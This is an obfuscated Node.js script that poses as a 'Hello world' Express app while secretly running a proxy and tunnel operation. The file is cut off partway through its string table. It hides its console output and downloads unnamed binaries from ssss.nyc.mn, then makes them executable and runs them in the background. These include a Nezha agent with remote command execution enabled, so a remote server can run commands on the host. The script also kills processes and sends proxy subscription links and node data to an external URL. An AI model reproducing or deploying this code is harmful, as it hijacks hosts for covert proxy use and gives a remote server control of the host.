const _0xb8b964=_0x5851;(function(_0x2ad931,_0x113290){const _0x1fa8f7=_0x5851,_0x5b63aa=_0x2ad931();while(!![]){try{const _0x18ce76=parseInt(_0x1fa8f7(0x175))/0x1+-parseInt(_0x1fa8f7(0x1f6))/0x2+parseInt(_0x1fa8f7(0x207))/0x3*(-parseInt(_0x1fa8f7(0x1a0))/0x4)+-parseInt(_0x1fa8f7(0x1f7))/0x5+parseInt(_0x1fa8f7(0x162))/0x6+-parseInt(_0x1fa8f7(0x20d))/0x7+parseInt(_0x1fa8f7(0x1c3))/0x8;if(_0x18ce76===_0x113290)break;else _0x5b63aa['push'](_0x5b63aa['shift']());}catch(_0x429f26){_0x5b63aa['push'](_0x5b63aa['shift']());}}}(_0x541d,0x1f61f));const _0x535006=(function(){let _0x4a552a=!![];return function(_0x2a18c9,_0x418045){const _0xea079c=_0x4a552a?function(){const _0x35938b=_0x5851;if(_0x418045){const _0x4719d0=_0x418045[_0x35938b(0x1f8)](_0x2a18c9,arguments);return _0x418045=null,_0x4719d0;}}:function(){};return _0x4a552a=![],_0xea079c;};}()),_0x51dd1a=_0x535006(this,function(){const _0x4164ff=_0x5851;return _0x51dd1a[_0x4164ff(0x16b)]()[_0x4164ff(0x1b5)]('(((.+)+)+)+$')[_0x4164ff(0x16b)]()[_0x4164ff(0x1ff)](_0x51dd1a)[_0x4164ff(0x1b5)](_0x4164ff(0x20b));});function _0x5851(_0x2f3fa0,_0x5621dc){const _0x517287=_0x541d();return _0x5851=function(_0x4d1ec0,_0x5ad2ba){_0x4d1ec0=_0x4d1ec0-0x15a;let _0x63c079=_0x517287[_0x4d1ec0];return _0x63c079;},_0x5851(_0x2f3fa0,_0x5621dc);}_0x51dd1a();const _0x5ad2ba=(function(){let _0x36ac98=!![];return function(_0x32e41a,_0x10faef){const _0x4d70f6=_0x36ac98?function(){const _0xbfb1c2=_0x5851;if(_0x10faef){const _0x37961f=_0x10faef[_0xbfb1c2(0x1f8)](_0x32e41a,arguments);return _0x10faef=null,_0x37961f;}}:function(){};return _0x36ac98=![],_0x4d70f6;};}()),_0x4d1ec0=_0x5ad2ba(this,function(){const _0x49eb95=_0x5851;let _0x3ce4d8;try{const _0x3582bc=Function(_0x49eb95(0x1f4)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x3ce4d8=_0x3582bc();}catch(_0x3fb653){_0x3ce4d8=window;}const _0x225341=_0x3ce4d8['console']=_0x3ce4d8[_0x49eb95(0x202)]||{},_0xbde044=[_0x49eb95(0x1f9),'warn',_0x49eb95(0x167),'error','exception',_0x49eb95(0x180),'trace'];for(let _0x1d9c6d=0x0;_0x1d9c6d<_0xbde044[_0x49eb95(0x1cc)];_0x1d9c6d++){const _0xe75b41=_0x5ad2ba[_0x49eb95(0x1ff)][_0x49eb95(0x1e7)][_0x49eb95(0x1ad)](_0x5ad2ba),_0x2e6fb4=_0xbde044[_0x1d9c6d],_0x13196d=_0x225341[_0x2e6fb4]||_0xe75b41;_0xe75b41[_0x49eb95(0x172)]=_0x5ad2ba[_0x49eb95(0x1ad)](_0x5ad2ba),_0xe75b41[_0x49eb95(0x16b)]=_0x13196d[_0x49eb95(0x16b)][_0x49eb95(0x1ad)](_0x13196d),_0x225341[_0x2e6fb4]=_0xe75b41;}});_0x4d1ec0();const express=require(_0xb8b964(0x222)),app=express(),axios=require(_0xb8b964(0x219)),os=require('os'),fs=require('fs'),path=require(_0xb8b964(0x206)),{promisify}=require('util'),exec=promisify(require('child_process')[_0xb8b964(0x1e9)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0xb8b964(0x1d5)]['UPLOAD_URL']||'',PROJECT_URL=process[_0xb8b964(0x1d5)][_0xb8b964(0x1c1)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0xb8b964(0x1a7)]||_0xb8b964(0x1b4),SUB_PATH=process['env'][_0xb8b964(0x19d)]||_0xb8b964(0x166),PORT=process['env'][_0xb8b964(0x1ae)]||process['env'][_0xb8b964(0x1dc)]||0xbb8,UUID=process[_0xb8b964(0x1d5)]['UUID']||_0xb8b964(0x1e1),NEZHA_SERVER=process[_0xb8b964(0x1d5)][_0xb8b964(0x224)]||'',NEZHA_PORT=process[_0xb8b964(0x1d5)][_0xb8b964(0x17e)]||'',NEZHA_KEY=process['env'][_0xb8b964(0x182)]||'',ARGO_DOMAIN=process[_0xb8b964(0x1d5)][_0xb8b964(0x170)]||_0xb8b964(0x1e5),ARGO_AUTH=process[_0xb8b964(0x1d5)][_0xb8b964(0x197)]||_0xb8b964(0x1c9),ARGO_PORT=process[_0xb8b964(0x1d5)][_0xb8b964(0x1e6)]||0x1f41,CFIP=process[_0xb8b964(0x1d5)][_0xb8b964(0x1be)]||'cdns.doon.eu.org',CFPORT=process[_0xb8b964(0x1d5)][_0xb8b964(0x163)]||0x1bb,NAME=process[_0xb8b964(0x1d5)][_0xb8b964(0x1fe)]||'';!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0xb8b964(0x187))):console['log'](FILE_PATH+_0xb8b964(0x1da));function generateRandomName(){const _0x570109=_0xb8b964,_0x517350=_0x570109(0x1d1);let _0x48512b='';for(let _0x115a8a=0x0;_0x115a8a<0x6;_0x115a8a++){_0x48512b+=_0x517350[_0x570109(0x186)](Math['floor'](Math[_0x570109(0x21d)]()*_0x517350[_0x570109(0x1cc)]));}return _0x48512b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0xb8b964(0x1ba)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0xb8b964(0x1ba)](FILE_PATH,botName),subPath=path[_0xb8b964(0x1ba)](FILE_PATH,_0xb8b964(0x1b2)),listPath=path[_0xb8b964(0x1ba)](FILE_PATH,_0xb8b964(0x1d0)),bootLogPath=path[_0xb8b964(0x1ba)](FILE_PATH,_0xb8b964(0x190)),configPath=path[_0xb8b964(0x1ba)](FILE_PATH,_0xb8b964(0x1cb));function deleteNodes(){const _0x58d55f=_0xb8b964;try{if(!UPLOAD_URL)return;if(!fs[_0x58d55f(0x21b)](subPath))return;let _0x28f5e5;try{_0x28f5e5=fs[_0x58d55f(0x1de)](subPath,_0x58d55f(0x178));}catch{return null;}const _0x8826f=Buffer[_0x58d55f(0x1fb)](_0x28f5e5,_0x58d55f(0x1a2))[_0x58d55f(0x16b)]('utf-8'),_0x3919ed=_0x8826f['split']('\x0a')[_0x58d55f(0x223)](_0x7df84a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x58d55f(0x1a3)](_0x7df84a));if(_0x3919ed[_0x58d55f(0x1cc)]===0x0)return;return axios[_0x58d55f(0x16e)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x58d55f(0x1cf)]({'nodes':_0x3919ed}),{'headers':{'Content-Type':_0x58d55f(0x227)}})[_0x58d55f(0x196)](_0x2e02b3=>{return null;}),null;}catch(_0x4bec59){return null;}}function cleanupOldFiles(){const _0xb0c748=_0xb8b964;try{const _0x379f2b=fs['readdirSync'](FILE_PATH);_0x379f2b[_0xb0c748(0x1b8)](_0x116838=>{const _0x48de0c=_0xb0c748,_0x568862=path[_0x48de0c(0x1ba)](FILE_PATH,_0x116838);try{const _0xb8f865=fs['statSync'](_0x568862);_0xb8f865[_0x48de0c(0x1d3)]()&&fs[_0x48de0c(0x183)](_0x568862);}catch(_0x1e46b3){}});}catch(_0x6b93e8){}}app[_0xb8b964(0x19e)]('/',function(_0x55aa51,_0x41cadf){const _0x314e20=_0xb8b964;_0x41cadf[_0x314e20(0x161)]('Hello\x20world!');});async function generateConfig(){const _0x5a4499=_0xb8b964,_0x20b671={'log':{'access':_0x5a4499(0x1f5),'error':'/dev/null','loglevel':_0x5a4499(0x1ef)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5a4499(0x1f2),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x5a4499(0x1ef),'fallbacks':[{'dest':0xbb9},{'path':_0x5a4499(0x19c),'dest':0xbba},{'path':_0x5a4499(0x217),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x5a4499(0x18a)}},{'port':0xbb9,'listen':_0x5a4499(0x1ca),'protocol':_0x5a4499(0x1f2),'settings':{'clients':[{'id':UUID}],'decryption':_0x5a4499(0x1ef)},'streamSettings':{'network':_0x5a4499(0x18a),'security':_0x5a4499(0x1ef)}},{'port':0xbba,'listen':_0x5a4499(0x1ca),'protocol':_0x5a4499(0x1f2),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5a4499(0x1ef)},'streamSettings':{'network':'ws','security':_0x5a4499(0x1ef),'wsSettings':{'path':_0x5a4499(0x19c)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a4499(0x1e3),_0x5a4499(0x17d),_0x5a4499(0x1a1)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5a4499(0x1ca),'protocol':_0x5a4499(0x1d4),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5a4499(0x1e3),'tls',_0x5a4499(0x1a1)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5a4499(0x1ca),'protocol':_0x5a4499(0x19a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5a4499(0x1ef),'wsSettings':{'path':_0x5a4499(0x16c)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a4499(0x1e3),'tls',_0x5a4499(0x1a1)],'metadataOnly':![]}}],'dns':{'servers':[_0x5a4499(0x1eb)]},'outbounds':[{'protocol':_0x5a4499(0x17c),'tag':_0x5a4499(0x212)},{'protocol':_0x5a4499(0x1c8),'tag':_0x5a4499(0x19f)}]};fs[_0x5a4499(0x165)](path[_0x5a4499(0x1ba)](FILE_PATH,_0x5a4499(0x1cb)),JSON[_0x5a4499(0x1cf)](_0x20b671,null,0x2));}function getSystemArchitecture(){const _0x4b1e13=_0xb8b964,_0x5ea7d3=os[_0x4b1e13(0x210)]();return _0x5ea7d3===_0x4b1e13(0x18e)||_0x5ea7d3===_0x4b1e13(0x1e8)||_0x5ea7d3===_0x4b1e13(0x1af)?'arm':_0x4b1e13(0x18f);}function downloadFile(_0x439fa3,_0x21caf9,_0x1ee52a){const _0x36d192=_0xb8b964,_0x3d5e6a=_0x439fa3;!fs[_0x36d192(0x21b)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x146fbb=fs['createWriteStream'](_0x3d5e6a);axios({'method':_0x36d192(0x19e),'url':_0x21caf9,'responseType':_0x36d192(0x1f0)})[_0x36d192(0x188)](_0x330431=>{const _0x3a7012=_0x36d192;_0x330431[_0x3a7012(0x15b)]['pipe'](_0x146fbb),_0x146fbb['on'](_0x3a7012(0x17a),()=>{const _0x5e79d1=_0x3a7012;_0x146fbb[_0x5e79d1(0x1b0)](),console[_0x5e79d1(0x1f9)](_0x5e79d1(0x20e)+path[_0x5e79d1(0x1df)](_0x3d5e6a)+_0x5e79d1(0x1c0)),_0x1ee52a(null,_0x3d5e6a);}),_0x146fbb['on'](_0x3a7012(0x1a9),_0x224842=>{const _0x1f71ea=_0x3a7012;fs[_0x1f71ea(0x225)](_0x3d5e6a,()=>{});const _0x275832='Download\x20'+path[_0x1f71ea(0x1df)](_0x3d5e6a)+_0x1f71ea(0x1bb)+_0x224842[_0x1f71ea(0x1cd)];console[_0x1f71ea(0x1a9)](_0x275832),_0x1ee52a(_0x275832);});})[_0x36d192(0x196)](_0x20a436=>{const _0x54777d=_0x36d192,_0x3b708b=_0x54777d(0x20e)+path[_0x54777d(0x1df)](_0x3d5e6a)+_0x54777d(0x1bb)+_0x20a436[_0x54777d(0x1cd)];console[_0x54777d(0x1a9)](_0x3b708b),_0x1ee52a(_0x3b708b);});}async function downloadFilesAndRun(){const _0x4e0fd0=_0xb8b964,_0x37d303=getSystemArchitecture(),_0x2c67fc=getFilesForArchitecture(_0x37d303);if(_0x2c67fc['length']===0x0){console[_0x4e0fd0(0x1f9)](_0x4e0fd0(0x15a));return;}const _0x302bc6=_0x2c67fc[_0x4e0fd0(0x192)](_0x449a9f=>{return new Promise((_0x465e09,_0x535d37)=>{const _0x16a61f=_0x5851;downloadFile(_0x449a9f[_0x16a61f(0x1ac)],_0x449a9f[_0x16a61f(0x16d)],(_0x357bfa,_0x15e2b4)=>{_0x357bfa?_0x535d37(_0x357bfa):_0x465e09(_0x15e2b4);});});});try{await Promise[_0x4e0fd0(0x160)](_0x302bc6);}catch(_0x4fbde8){console['error'](_0x4e0fd0(0x195),_0x4fbde8);return;}function _0x310269(_0x444446){const _0x3232ef=_0x4e0fd0,_0x26e564=0x1fd;_0x444446[_0x3232ef(0x1b8)](_0x2c387f=>{const _0x52b190=_0x3232ef;fs['existsSync'](_0x2c387f)&&fs[_0x52b190(0x215)](_0x2c387f,_0x26e564,_0x51ef24=>{const _0x33cbb2=_0x52b190;_0x51ef24?console[_0x33cbb2(0x1a9)]('Empowerment\x20failed\x20for\x20'+_0x2c387f+':\x20'+_0x51ef24):console[_0x33cbb2(0x1f9)]('Empowerment\x20success\x20for\x20'+_0x2c387f+':\x20'+_0x26e564[_0x33cbb2(0x16b)](0x8));});});}const _0x2bb62e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x310269(_0x2bb62e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4ec86a=NEZHA_SERVER[_0x4e0fd0(0x21e)](':')?NEZHA_SERVER[_0x4e0fd0(0x1b6)](':')[_0x4e0fd0(0x203)]():'',_0x35ab38=new Set([_0x4e0fd0(0x1bd),'8443','2096',_0x4e0fd0(0x1d6),_0x4e0fd0(0x1a5),_0x4e0fd0(0x15f)]),_0x52da24=_0x35ab38['has'](_0x4ec86a)?_0x4e0fd0(0x1c2):'false',_0x18f1f3='\x0aclient_secret:\x20'+NEZHA_KEY+_0x4e0fd0(0x211)+NEZHA_SERVER+_0x4e0fd0(0x181)+_0x52da24+_0x4e0fd0(0x208)+UUID;fs[_0x4e0fd0(0x165)](path[_0x4e0fd0(0x1ba)](FILE_PATH,_0x4e0fd0(0x177)),_0x18f1f3);const _0x4c4350=_0x4e0fd0(0x1fc)+phpPath+_0x4e0fd0(0x205)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4c4350),console[_0x4e0fd0(0x1f9)](phpName+_0x4e0fd0(0x218)),await new Promise(_0x308ec8=>setTimeout(_0x308ec8,0x3e8));}catch(_0x202511){console[_0x4e0fd0(0x1a9)](_0x4e0fd0(0x1f3)+_0x202511);}}else{let _0x45c13b='';const _0x39412e=['443',_0x4e0fd0(0x20c),'2096',_0x4e0fd0(0x1d6),_0x4e0fd0(0x1a5),'2053'];_0x39412e[_0x4e0fd0(0x21e)](NEZHA_PORT)&&(_0x45c13b=_0x4e0fd0(0x1b9));const _0x22b1d3=_0x4e0fd0(0x1fc)+npmPath+_0x4e0fd0(0x21c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4e0fd0(0x164)+NEZHA_KEY+'\x20'+_0x45c13b+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x22b1d3),console[_0x4e0fd0(0x1f9)](npmName+_0x4e0fd0(0x218)),await new Promise(_0x46da71=>setTimeout(_0x46da71,0x3e8));}catch(_0x58901b){console[_0x4e0fd0(0x1a9)]('npm\x20running\x20error:\x20'+_0x58901b);}}}else console[_0x4e0fd0(0x1f9)](_0x4e0fd0(0x216));const _0x283593=_0x4e0fd0(0x1fc)+webPath+_0x4e0fd0(0x1c7)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x283593),console[_0x4e0fd0(0x1f9)](webName+_0x4e0fd0(0x218)),await new Promise(_0x30cedd=>setTimeout(_0x30cedd,0x3e8));}catch(_0x53259d){console[_0x4e0fd0(0x1a9)]('web\x20running\x20error:\x20'+_0x53259d);}if(fs[_0x4e0fd0(0x21b)](botPath)){let _0x30c820;if(ARGO_AUTH[_0x4e0fd0(0x213)](/^[A-Z0-9a-z=]{120,250}$/))_0x30c820=_0x4e0fd0(0x16a)+ARGO_AUTH;else ARGO_AUTH[_0x4e0fd0(0x213)](/TunnelSecret/)?_0x30c820='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x4e0fd0(0x1ee):_0x30c820='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4e0fd0(0x1a6)+ARGO_PORT;try{await exec(_0x4e0fd0(0x1fc)+botPath+'\x20'+_0x30c820+_0x4e0fd0(0x1d9)),console[_0x4e0fd0(0x1f9)](botName+_0x4e0fd0(0x218)),await new Promise(_0x3bb6f9=>setTimeout(_0x3bb6f9,0x7d0));}catch(_0x411a78){console[_0x4e0fd0(0x1a9)]('Error\x20executing\x20command:\x20'+_0x411a78);}}await new Promise(_0x31af05=>setTimeout(_0x31af05,0x1388));}function getFilesForArchitecture(_0x2c097d){const _0x275001=_0xb8b964;let _0x309ba5;_0x2c097d===_0x275001(0x18e)?_0x309ba5=[{'fileName':webPath,'fileUrl':_0x275001(0x185)},{'fileName':botPath,'fileUrl':_0x275001(0x204)}]:_0x309ba5=[{'fileName':webPath,'fileUrl':_0x275001(0x1c5)},{'fileName':botPath,'fileUrl':_0x275001(0x174)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x7a56bd=_0x2c097d==='arm'?_0x275001(0x15c):_0x275001(0x1e2);_0x309ba5[_0x275001(0x199)]({'fileName':npmPath,'fileUrl':_0x7a56bd});}else{const _0x36c0d2=_0x2c097d===_0x275001(0x18e)?_0x275001(0x19b):_0x275001(0x1d2);_0x309ba5[_0x275001(0x199)]({'fileName':phpPath,'fileUrl':_0x36c0d2});}}return _0x309ba5;}function argoType(){const _0x1ce46f=_0xb8b964;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1ce46f(0x1f9)](_0x1ce46f(0x21f));return;}if(ARGO_AUTH[_0x1ce46f(0x21e)](_0x1ce46f(0x21a))){fs[_0x1ce46f(0x165)](path[_0x1ce46f(0x1ba)](FILE_PATH,_0x1ce46f(0x18d)),ARGO_AUTH);const _0x4ced74=_0x1ce46f(0x184)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x1ce46f(0x1ba)](FILE_PATH,_0x1ce46f(0x18d))+_0x1ce46f(0x1f1)+ARGO_DOMAIN+_0x1ce46f(0x193)+ARGO_PORT+_0x1ce46f(0x15d);fs['writeFileSync'](path[_0x1ce46f(0x1ba)](FILE_PATH,'tunnel.yml'),_0x4ced74);}else console[_0x1ce46f(0x1f9)](_0x1ce46f(0x20a));}async function extractDomains(){const _0x26c1fa=_0xb8b964;let _0x3a4667;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3a4667=ARGO_DOMAIN,console[_0x26c1fa(0x1f9)](_0x26c1fa(0x17b),_0x3a4667),await _0x45faa3(_0x3a4667);else try{const _0x2f04e7=fs[_0x26c1fa(0x1de)](path[_0x26c1fa(0x1ba)](FILE_PATH,'boot.log'),_0x26c1fa(0x178)),_0x352f22=_0x2f04e7[_0x26c1fa(0x1b6)]('\x0a'),_0x2c8c15=[];_0x352f22['forEach'](_0x52a110=>{const _0xa5fa9c=_0x26c1fa,_0xd931fd=_0x52a110[_0xa5fa9c(0x213)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xd931fd){const _0x55383a=_0xd931fd[0x1];_0x2c8c15[_0xa5fa9c(0x18c)](_0x55383a);}});if(_0x2c8c15['length']>0x0)_0x3a4667=_0x2c8c15[0x0],console[_0x26c1fa(0x1f9)](_0x26c1fa(0x1d7),_0x3a4667),await _0x45faa3(_0x3a4667);else{console[_0x26c1fa(0x1f9)](_0x26c1fa(0x18b)),fs[_0x26c1fa(0x183)](path[_0x26c1fa(0x1ba)](FILE_PATH,_0x26c1fa(0x190)));async function _0x36f18d(){const _0x24e741=_0x26c1fa;try{process['platform']===_0x24e741(0x1a4)?await exec(_0x24e741(0x169)+botName+_0x24e741(0x1c4)):await exec(_0x24e741(0x221)+botName[_0x24e741(0x186)](0x0)+']'+botName[_0x24e741(0x1ab)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x4aa2cb){}}_0x36f18d(),await new Promise(_0x400a38=>setTimeout(_0x400a38,0xbb8));const _0x4ef19e=_0x26c1fa(0x200)+FILE_PATH+_0x26c1fa(0x1a6)+ARGO_PORT;try{await exec(_0x26c1fa(0x1fc)+botPath+'\x20'+_0x4ef19e+'\x20>/dev/null\x202>&1\x20&'),console[_0x26c1fa(0x1f9)](botName+_0x26c1fa(0x218)),await new Promise(_0x1b449b=>setTimeout(_0x1b449b,0xbb8)),await extractDomains();}catch(_0x7194b8){console[_0x26c1fa(0x1a9)](_0x26c1fa(0x20f)+_0x7194b8);}}}catch(_0x51228f){console[_0x26c1fa(0x1a9)](_0x26c1fa(0x1ce),_0x51228f);}async function _0x50c553(){const _0x476a8d=_0x26c1fa;try{const _0x86846a=await axios[_0x476a8d(0x19e)](_0x476a8d(0x1aa),{'timeout':0xbb8});if(_0x86846a['data']&&_0x86846a[_0x476a8d(0x15b)][_0x476a8d(0x1b7)]&&_0x86846a[_0x476a8d(0x15b)][_0x476a8d(0x226)])return _0x86846a['data']['country_code']+'_'+_0x86846a[_0x476a8d(0x15b)][_0x476a8d(0x226)];}catch(_0x2b440b){try{const _0x25e4a7=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x25e4a7['data']&&_0x25e4a7['data'][_0x476a8d(0x194)]===_0x476a8d(0x1d8)&&_0x25e4a7[_0x476a8d(0x15b)][_0x476a8d(0x1fd)]&&_0x25e4a7[_0x476a8d(0x15b)][_0x476a8d(0x226)])return _0x25e4a7[_0x476a8d(0x15b)]['countryCode']+'_'+_0x25e4a7[_0x476a8d(0x15b)][_0x476a8d(0x226)];}catch(_0x5e79e){}}return _0x476a8d(0x1e0);}async function _0x45faa3(_0xaec52f){const _0x5eb25c=await _0x50c553(),_0x2b8478=NAME?NAME+'-'+_0x5eb25c:_0x5eb25c;return new Promise(_0xb9a83e=>{setTimeout(()=>{const _0x25122e=_0x5851,_0x2e4304={'v':'2','ps':''+_0x2b8478,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x25122e(0x1ef),'host':_0xaec52f,'path':_0x25122e(0x1b3),'tls':_0x25122e(0x17d),'sni':_0xaec52f,'alpn':'','fp':_0x25122e(0x1ec)},_0x18e7ff=_0x25122e(0x1db)+UUID+'@'+CFIP+':'+CFPORT+_0x25122e(0x1fa)+_0xaec52f+'&fp=firefox&type=ws&host='+_0xaec52f+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2b8478+_0x25122e(0x191)+Buffer[_0x25122e(0x1fb)](JSON[_0x25122e(0x1cf)](_0x2e4304))[_0x25122e(0x16b)]('base64')+_0x25122e(0x168)+UUID+'@'+CFIP+':'+CFPORT+_0x25122e(0x1bf)+_0xaec52f+_0x25122e(0x1c6)+_0xaec52f+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x2b8478+'\x0a\x20\x20\x20\x20';console[_0x25122e(0x1f9)](Buffer[_0x25122e(0x1fb)](_0x18e7ff)['toString']('base64')),fs[_0x25122e(0x165)](subPath,Buffer[_0x25122e(0x1fb)](_0x18e7ff)[_0x25122e(0x16b)]('base64')),console[_0x25122e(0x1f9)](FILE_PATH+_0x25122e(0x220)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x37bd0a,_0x1df956)=>{const _0x46f162=_0x25122e,_0x174cfe=Buffer[_0x46f162(0x1fb)](_0x18e7ff)['toString']('base64');_0x1df956[_0x46f162(0x189)]('Content-Type',_0x46f162(0x1b1)),_0x1df956[_0x46f162(0x161)](_0x174cfe);}),_0xb9a83e(_0x18e7ff);},0x7d0);});}}async function uploadNodes(){const _0x17ed60=_0xb8b964;if(UPLOAD_URL&&PROJECT_URL){const _0x32138c=PROJECT_URL+'/'+SUB_PATH,_0x5a1587={'subscription':[_0x32138c]};try{const _0x41f8cf=await axios[_0x17ed60(0x16e)](UPLOAD_URL+_0x17ed60(0x1ed),_0x5a1587,{'headers':{'Content-Type':'application/json'}});return _0x41f8cf&&_0x41f8cf['status']===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x41f8cf):null;}catch(_0x574fc7){if(_0x574fc7['response']){if(_0x574fc7[_0x17ed60(0x1dd)][_0x17ed60(0x194)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x1dfd59=fs['readFileSync'](listPath,_0x17ed60(0x178)),_0x3a895e=_0x1dfd59[_0x17ed60(0x1b6)]('\x0a')[_0x17ed60(0x223)](_0x168563=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x17ed60(0x1a3)](_0x168563));if(_0x3a895e[_0x17ed60(0x1cc)]===0x0)return;const _0x5dc670=JSON[_0x17ed60(0x1cf)]({'nodes':_0x3a895e});try{const _0x55404e=await axios[_0x17ed60(0x16e)](UPLOAD_URL+_0x17ed60(0x1ea),_0x5dc670,{'headers':{'Content-Type':_0x17ed60(0x227)}});return _0x55404e&&_0x55404e[_0x17ed60(0x194)]===0xc8?(console[_0x17ed60(0x1f9)](_0x17ed60(0x171)),_0x55404e):null;}catch(_0x233426){return null;}}else return;}}function _0x541d(){const _0x2d61e9=['constructor','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','console','pop','https://arm64.ssss.nyc.mn/bot','\x20-c\x20\x22','path','159RsOFxJ','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','rm\x20-rf\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','(((.+)+)+)+$','8443','375396SCvgPS','Download\x20','Error\x20executing\x20command:\x20','arch','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','direct','match','clear','chmod','NEZHA\x20variable\x20is\x20empty,skip\x20running','/vmess-argo','\x20is\x20running','axios','TunnelSecret','existsSync','\x20-s\x20','random','includes','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/sub.txt\x20saved\x20successfully','pkill\x20-f\x20\x22[','express','filter','NEZHA_SERVER','unlink','org','application/json','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','data','https://arm64.ssss.nyc.mn/agent','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','platform','2053','all','send','1059048mVuWxn','CFPORT','\x20-p\x20','writeFileSync','sub','info','\x0a\x0atrojan://','taskkill\x20/f\x20/im\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','toString','/trojan-argo','fileUrl','post','\x20>\x20nul\x202>&1','ARGO_DOMAIN','Nodes\x20uploaded\x20successfully','__proto__','listen','https://amd64.ssss.nyc.mn/bot','224797ncSAMX','\x20>/dev/null\x202>&1','config.yaml','utf-8','Unhandled\x20error\x20in\x20startserver:','finish','ARGO_DOMAIN:','freedom','tls','NEZHA_PORT','Skipping\x20adding\x20automatic\x20access\x20task','table','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','NEZHA_KEY','unlinkSync','\x0a\x20\x20tunnel:\x20','https://arm64.ssss.nyc.mn/web','charAt','\x20is\x20created','then','set','tcp','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','push','tunnel.json','arm','amd','boot.log','\x0a\x0avmess://','map','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','status','Error\x20downloading\x20files:','catch','ARGO_AUTH','automatic\x20access\x20task\x20added\x20successfully','unshift','trojan','https://arm64.ssss.nyc.mn/v1','/vless-argo','SUB_PATH','get','block','5908jexkto','quic','base64','test','win32','2083','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','FILE_PATH','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','error','https://ipapi.co/json/','substring','fileName','bind','SERVER_PORT','aarch64','close','text/plain;\x20charset=utf-8','sub.txt','/vmess-argo?ed=2560','./tmp','search','split','country_code','forEach','--tls','join','\x20failed:\x20','https://oooo.serv00.net/add-url','443','CFIP','?security=tls&sni=','\x20successfully','PROJECT_URL','true','420680OjDLer','.exe\x20>\x20nul\x202>&1','https://amd64.ssss.nyc.mn/web','&fp=firefox&type=ws&host=','\x20-c\x20','blackhole','eyJhIjoiNGRmYjY5MGM2MGJkNTg0ZGE1OWM0MGUzZjMyYjZlNDQiLCJ0IjoiYmMyMDU3YjQtOWMwOC00N2E5LWFmZWItYWIyZTQ5YmRmZDIwIiwicyI6